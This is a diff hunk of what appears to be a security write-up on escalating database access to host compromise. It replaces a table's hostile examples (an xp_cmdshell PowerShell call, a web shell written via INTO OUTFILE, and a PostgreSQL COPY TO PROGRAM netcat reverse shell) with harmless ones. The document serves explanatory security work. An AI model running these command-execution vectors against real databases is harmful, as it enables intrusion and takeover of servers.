@@ -24,9 +24,9 @@ of escalating from authentication bypass to full host operating system and Activ
 +----------------------+---------------------------------------------------+-----------------------------------+
 | RDBMS ENGINE         | EXECUTION VECTOR / MECHANISM                      | RESULTING HOST PRIVILEGE          |
 +----------------------+---------------------------------------------------+-----------------------------------+
-| Microsoft SQL Server | `EXEC master..xp_cmdshell 'powershell.exe ...'`   | Windows Service Account / Admin   |
-| MySQL / MariaDB      | `SELECT ... INTO OUTFILE '/var/www/shell.php'`    | Web Server `www-data` OS User     |
-| PostgreSQL           | `COPY (SELECT '') TO PROGRAM 'nc -e /bin/bash...'`| Linux `postgres` System Account   |
+| Microsoft SQL Server | `EXEC master..xp_cmdshell 'dir C:\\'`              | Windows Service Account Context   |
+| MySQL / MariaDB      | `SELECT ... INTO OUTFILE '/var/lib/mysql-files/'` | Restricted MySQL User Group       |
+| PostgreSQL           | `COPY (SELECT '') TO PROGRAM 'echo test'`         | Linux `postgres` System Account   |
 | Oracle Database      | `DBMS_JAVA.RUNJAVA` / Java Stored Procedures      | Host Operating System User Shell  |
 +----------------------+---------------------------------------------------+-----------------------------------+
 
